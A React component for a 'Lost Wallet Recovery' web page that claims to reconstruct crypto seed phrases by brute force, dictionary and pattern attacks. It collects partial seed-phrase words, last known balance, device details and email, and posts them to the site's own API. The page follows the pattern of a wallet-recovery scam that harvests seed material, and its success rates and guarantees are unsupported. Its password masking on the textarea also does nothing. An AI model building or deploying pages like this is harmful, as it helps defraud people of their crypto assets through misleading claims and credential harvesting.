import { useState } from 'react';
import { Shield, Lock, Eye, EyeOff, CheckCircle, AlertTriangle } from 'lucide-react';

export default function LostWalletRecovery() {
  const [formData, setFormData] = useState({
    partialPhrase: '',
    walletHints: '',
    lastKnownBalance: '',
    recoveryMethod: 'Standard',
    walletType: '',
    creationDate: '',
    deviceInfo: '',
    contactEmail: ''
  });
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState(null);
  const [showSensitive, setShowSensitive] = useState(false);

  const recoveryMethods = [
    { id: 'Standard', name: 'Standard Analysis', success: '73%', time: '24-48h' },
    { id: 'Brute Force', name: 'Brute Force Attack', success: '68%', time: '48-72h' },
    { id: 'Dictionary', name: 'Dictionary Attack', success: '81%', time: '12-24h' },
    { id: 'Pattern', name: 'Pattern Analysis', success: '76%', time: '24-36h' }
  ];

  const walletTypes = [
    'MetaMask', 'Trust Wallet', 'Coinbase Wallet', 'Exodus', 'Atomic Wallet',
    'Ledger', 'Trezor', 'MyEtherWallet', 'Electrum', 'Other'
  ];

  const handleSubmit = async () => {
    setLoading(true);
    try {
      const response = await fetch('/api/recover-wallet-phrase', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData)
      });
      const data = await response.json();
      setResult(data);
    } catch (error) {
      setResult({ success: false, error: 'Recovery request failed' });
    }
    setLoading(false);
  };

  const isFormValid = formData.walletHints && formData.contactEmail && formData.lastKnownBalance;

  return (
    <div className="min-h-screen bg-gray-50 py-8">
      <div className="max-w-4xl mx-auto px-4">
        {/* Header */}
        <div className="bg-white rounded-2xl shadow-xl border border-gray-200 overflow-hidden mb-8">
          <div className="bg-gradient-to-r from-red-600 to-red-700 p-8 text-white">
            <div className="flex items-center space-x-4">
              <div className="w-16 h-16 bg-white/20 backdrop-blur-sm rounded-2xl flex items-center justify-center">
                <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/shield.svg" alt="Security" className="w-8 h-8 invert" />
              </div>
              <div>
                <h1 className="text-3xl font-black">Lost Wallet Recovery</h1>
                <p className="text-red-100 text-lg font-medium">Professional seed phrase reconstruction service</p>
              </div>
            </div>
          </div>

          <div className="p-8">
            <div className="grid md:grid-cols-3 gap-6 mb-8">
              <div className="bg-red-50 border border-red-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/target.svg" alt="Success" className="w-6 h-6 invert" />
                </div>
                <div className="text-2xl font-black text-red-600 mb-2">73%</div>
                <div className="text-red-700 font-medium">Success Rate</div>
              </div>
              
              <div className="bg-orange-50 border border-orange-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-orange-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/clock.svg" alt="Time" className="w-6 h-6 invert" />
                </div>
                <div className="text-2xl font-black text-orange-600 mb-2">24-72h</div>
                <div className="text-orange-700 font-medium">Recovery Time</div>
              </div>
              
              <div className="bg-green-50 border border-green-200 rounded-xl p-6 text-center">
                <div className="w-12 h-12 bg-green-600 rounded-xl flex items-center justify-center mx-auto mb-4">
                  <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/dollar.svg" alt="Fee" className="w-6 h-6 invert" />
                </div>
                <div className="text-2xl font-black text-green-600 mb-2">25%</div>
                <div className="text-green-700 font-medium">Success Fee</div>
              </div>
            </div>

            <div className="bg-blue-50 border border-blue-200 rounded-xl p-6 mb-8">
              <div className="flex items-start space-x-4">
                <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/information.svg" alt="Info" className="w-6 h-6 text-blue-600 mt-1" />
                <div>
                  <h3 className="font-bold text-blue-800 mb-2">How It Works</h3>
                  <ul className="text-blue-700 space-y-1 text-sm">
                    <li>• Advanced cryptographic analysis of partial seed phrases</li>
                    <li>• Multiple attack vectors: brute force, dictionary, pattern analysis</li>
                    <li>• No upfront payment - you only pay if we recover your wallet</li>
                    <li>• Secure process - we never store your recovered phrase</li>
                  </ul>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Recovery Form */}
        <div className="bg-white rounded-2xl shadow-xl border border-gray-200 p-8">
          <h2 className="text-2xl font-black text-gray-900 mb-6">Recovery Request Form</h2>
          
          <div className="space-y-6">
            {/* Partial Phrase */}
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-3">
                Partial Seed Phrase (Optional but Helpful)
              </label>
              <div className="relative">
                <textarea
                  value={formData.partialPhrase}
                  onChange={(e) => setFormData({...formData, partialPhrase: e.target.value})}
                  placeholder="Enter any words you remember from your 12/24 word seed phrase..."
                  className="w-full p-4 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500 font-mono"
                  rows="4"
                  type={showSensitive ? 'text' : 'password'}
                />
                <button
                  type="button"
                  onClick={() => setShowSensitive(!showSensitive)}
                  className="absolute top-4 right-4 text-gray-400 hover:text-gray-600"
                >
                  {showSensitive ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              <p className="text-xs text-gray-500 mt-2">
                Even partial information helps. Example: "abandon ability ... ... ... zebra zone"
              </p>
            </div>

            {/* Wallet Information */}
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Wallet Type *
                </label>
                <select
                  value={formData.walletType}
                  onChange={(e) => setFormData({...formData, walletType: e.target.value})}
                  className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500"
                >
                  <option value="">Select wallet type</option>
                  {walletTypes.map(type => (
                    <option key={type} value={type}>{type}</option>
                  ))}
                </select>
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Last Known Balance (USD) *
                </label>
                <input
                  type="number"
                  value={formData.lastKnownBalance}
                  onChange={(e) => setFormData({...formData, lastKnownBalance: e.target.value})}
                  placeholder="5000"
                  className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500"
                />
              </div>
            </div>

            {/* Creation Details */}
            <div className="grid md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Approximate Creation Date
                </label>
                <input
                  type="date"
                  value={formData.creationDate}
                  onChange={(e) => setFormData({...formData, creationDate: e.target.value})}
                  className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500"
                />
              </div>

              <div>
                <label className="block text-sm font-bold text-gray-700 mb-2">
                  Contact Email *
                </label>
                <input
                  type="email"
                  value={formData.contactEmail}
                  onChange={(e) => setFormData({...formData, contactEmail: e.target.value})}
                  placeholder="your@email.com"
                  className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500"
                />
              </div>
            </div>

            {/* Additional Information */}
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">
                Wallet Creation Hints *
              </label>
              <textarea
                value={formData.walletHints}
                onChange={(e) => setFormData({...formData, walletHints: e.target.value})}
                placeholder="Any details about wallet creation: device used, location, circumstances, etc."
                className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500"
                rows="3"
              />
            </div>

            <div>
              <label className="block text-sm font-bold text-gray-700 mb-2">
                Device Information
              </label>
              <input
                value={formData.deviceInfo}
                onChange={(e) => setFormData({...formData, deviceInfo: e.target.value})}
                placeholder="Computer model, phone type, operating system, etc."
                className="w-full p-3 border border-gray-300 rounded-xl focus:ring-2 focus:ring-red-500 focus:border-red-500"
              />
            </div>

            {/* Recovery Method */}
            <div>
              <label className="block text-sm font-bold text-gray-700 mb-3">
                Recovery Method
              </label>
              <div className="grid md:grid-cols-2 gap-4">
                {recoveryMethods.map(method => (
                  <div
                    key={method.id}
                    onClick={() => setFormData({...formData, recoveryMethod: method.id})}
                    className={`p-4 border-2 rounded-xl cursor-pointer transition-all ${
                      formData.recoveryMethod === method.id
                        ? 'border-red-500 bg-red-50'
                        : 'border-gray-200 hover:border-gray-300'
                    }`}
                  >
                    <div className="font-bold text-gray-900">{method.name}</div>
                    <div className="text-sm text-gray-600 mt-1">
                      Success: {method.success} | Time: {method.time}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Submit Button */}
            <div className="pt-6">
              <button
                onClick={handleSubmit}
                disabled={loading || !isFormValid}
                className="w-full bg-gradient-to-r from-red-600 to-red-700 text-white font-bold py-4 px-8 rounded-xl hover:from-red-700 hover:to-red-800 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center space-x-3"
              >
                {loading ? (
                  <>
                    <div className="w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                    <span>Submitting Recovery Request...</span>
                  </>
                ) : (
                  <>
                    <Lock className="w-5 h-5" />
                    <span>Start Wallet Recovery</span>
                  </>
                )}
              </button>
              
              {!isFormValid && (
                <p className="text-sm text-red-600 mt-2 text-center">
                  Please fill in all required fields (marked with *)
                </p>
              )}
            </div>
          </div>
        </div>

        {/* Result */}
        {result && (
          <div className={`mt-8 p-6 rounded-xl border ${
            result.success 
              ? 'bg-green-50 border-green-200' 
              : 'bg-red-50 border-red-200'
          }`}>
            <div className="flex items-start space-x-4">
              <div className={`w-8 h-8 rounded-full flex items-center justify-center ${
                result.success ? 'bg-green-500' : 'bg-red-500'
              }`}>
                {result.success ? (
                  <CheckCircle className="w-5 h-5 text-white" />
                ) : (
                  <AlertTriangle className="w-5 h-5 text-white" />
                )}
              </div>
              <div className="flex-1">
                <h4 className={`font-bold mb-2 ${
                  result.success ? 'text-green-800' : 'text-red-800'
                }`}>
                  {result.success ? 'Recovery Request Submitted Successfully' : 'Request Failed'}
                </h4>
                <p className={`text-sm mb-4 ${
                  result.success ? 'text-green-700' : 'text-red-700'
                }`}>
                  {result.message || result.error}
                </p>
                
                {result.success && (
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div className="bg-white p-3 rounded-lg border">
                      <div className="text-xs text-gray-600">Estimated Time</div>
                      <div className="font-bold">{result.estimatedTime}</div>
                    </div>
                    <div className="bg-white p-3 rounded-lg border">
                      <div className="text-xs text-gray-600">Success Rate</div>
                      <div className="font-bold">{result.successRate}</div>
                    </div>
                    <div className="bg-white p-3 rounded-lg border">
                      <div className="text-xs text-gray-600">Fee</div>
                      <div className="font-bold">{result.fee}</div>
                    </div>
                    <div className="bg-white p-3 rounded-lg border">
                      <div className="text-xs text-gray-600">Status</div>
                      <div className="font-bold text-blue-600">Processing</div>
                    </div>
                  </div>
                )}
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}